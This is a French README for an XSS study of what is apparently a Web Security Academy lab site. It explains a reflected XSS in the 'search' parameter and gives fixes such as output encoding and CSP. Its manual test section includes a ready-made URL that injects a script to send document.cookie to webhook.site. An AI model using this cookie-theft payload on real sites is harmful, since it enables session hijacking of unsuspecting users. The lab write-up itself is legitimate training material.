# 🔒 Analyse de Sécurité - Étude des Vulnérabilités Web

Ce dépôt contient une analyse détaillée des vulnérabilités de sécurité identifiées sur le site web de test.

## 📁 Fichiers Inclus

### 1. `RAPPORT_VULNERABILITES.md`
Rapport complet d'analyse de sécurité contenant :
- Description détaillée de la vulnérabilité XSS identifiée
- Analyse technique approfondie
- 8 preuves de concept (PoC) différentes
- Recommandations de correction
- Checklist de sécurité

### 2. `PAYLOADS_XSS.md`
Collection de 42+ payloads XSS prêts à l'emploi :
- Payloads de base
- Payloads de vol de données
- Payloads de redirection
- Payloads de défacement
- Payloads alternatifs (bypass de filtres)
- Payloads avec encodage
- Payloads polyglottes
- Payloads avancés

### 3. `test_xss.py`
Script Python automatisé pour tester les vulnérabilités XSS :
- Tests automatisés de multiples payloads
- Analyse de la réponse du serveur
- Détection automatique de la réflexion
- Génération de rapports

### 4. `README.md` (ce fichier)
Documentation et guide d'utilisation

---

## 🎯 Vulnérabilité Identifiée

### XSS Réfléchi (Reflected Cross-Site Scripting)

**Sévérité:** 🔴 **CRITIQUE**  
**Paramètre vulnérable:** `search` (GET)  
**Endpoint:** `/?search=<payload>`

La fonctionnalité de recherche reflète directement la valeur du paramètre `search` dans le HTML sans aucun encodage, permettant l'exécution de code JavaScript arbitraire.

---

## 🚀 Utilisation

### Prérequis

```bash
# Installer Python 3
# Installer la bibliothèque requests
pip install requests
```

### Exécution du Script de Test

```bash
python test_xss.py
```

Le script va :
1. Analyser la réponse du serveur
2. Tester automatiquement 10 payloads différentes
3. Générer un rapport avec les résultats

### Test Manuel

Vous pouvez tester manuellement en utilisant les URLs suivantes :

#### Test de base (Alerte):
```
https://0a1600240463e66b803bb815008800e5.web-security-academy.net/?search=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
```

#### Test avec vol de cookies:
```
https://0a1600240463e66b803bb815008800e5.web-security-academy.net/?search=%3Cscript%3Efetch%28%27https%3A%2F%2Fwebhook.site%2FUNIQUE_ID%3Fcookie%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E
```

**Note:** Remplacez `UNIQUE_ID` par votre ID webhook.site pour recevoir les données.

---

## 📊 Résultats de l'Analyse

### Vulnérabilités Confirmées

✅ **XSS Réfléchi** - Confirmé et exploité avec succès

### Caractéristiques de la Vulnérabilité

- ✅ Aucun encodage HTML
- ✅ Aucun filtrage de caractères spéciaux
- ✅ Aucune validation d'entrée
- ✅ Injection directe dans le contexte HTML
- ✅ Exécution immédiate du JavaScript

### Impact

- Vol de cookies de session
- Vol d'informations d'authentification
- Défacement de page
- Redirection vers des sites malveillants
- Exécution d'actions au nom de l'utilisateur
- Vol de données sensibles

---

## 🛡️ Recommandations

### Correction Immédiate

1. **Encoder toutes les sorties utilisateur** (Output Encoding)
   ```php
   echo htmlspecialchars($search, ENT_QUOTES, 'UTF-8');
   ```

2. **Valider et filtrer les entrées** (Input Validation)
   ```php
   if (!preg_match('/^[a-zA-Z0-9\s]+$/', $search)) {
       $search = '';
   }
   ```

3. **Implémenter une Content Security Policy (CSP)**
   ```html
   <meta http-equiv="Content-Security-Policy" 
         content="default-src 'self'; script-src 'self';">
   ```

### Bonnes Pratiques

- Utiliser des frameworks modernes avec encodage automatique
- Activer HttpOnly et Secure sur les cookies
- Effectuer des tests de sécurité réguliers
- Former les développeurs aux bonnes pratiques

---

## 📚 Ressources

### Documentation

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

### Outils Utiles

- **Webhook.site:** https://webhook.site/ (pour recevoir les données volées lors des tests)
- **URL Encoder:** https://www.urlencoder.org/
- **Burp Suite:** Outil de test de sécurité web

---

## ⚠️ Avertissement Légal

**IMPORTANT:** Ce matériel est fourni **uniquement à des fins éducatives** et de test de sécurité **autorisé**. 

- ❌ Ne pas utiliser sur des systèmes sans autorisation explicite
- ❌ L'utilisation non autorisée est **illégale**
- ❌ Peut entraîner des poursuites pénales
- ✅ Utiliser uniquement dans des environnements de test contrôlés
- ✅ Obtenir une autorisation écrite avant tout test

---

## 📝 Structure du Projet

```
.
├── README.md                    # Documentation principale
├── RAPPORT_VULNERABILITES.md    # Rapport détaillé d'analyse
├── PAYLOADS_XSS.md             # Collection de payloads
└── test_xss.py                 # Script de test automatisé
```

---

## 🔍 Méthodologie d'Analyse

1. **Reconnaissance:** Identification des fonctionnalités du site
2. **Test de base:** Injection d'une payload XSS simple
3. **Confirmation:** Vérification de l'exécution du code
4. **Analyse approfondie:** Test de multiples payloads
5. **Documentation:** Création du rapport et des PoC

---

## 📞 Support

Pour toute question concernant cette analyse :
- Consultez le rapport détaillé dans `RAPPORT_VULNERABILITES.md`
- Référez-vous aux payloads dans `PAYLOADS_XSS.md`
- Exécutez `test_xss.py` pour des tests automatisés

---

**Version:** 1.0  
**Date:** Analyse effectuée  
**Statut:** Vulnérabilité confirmée et documentée
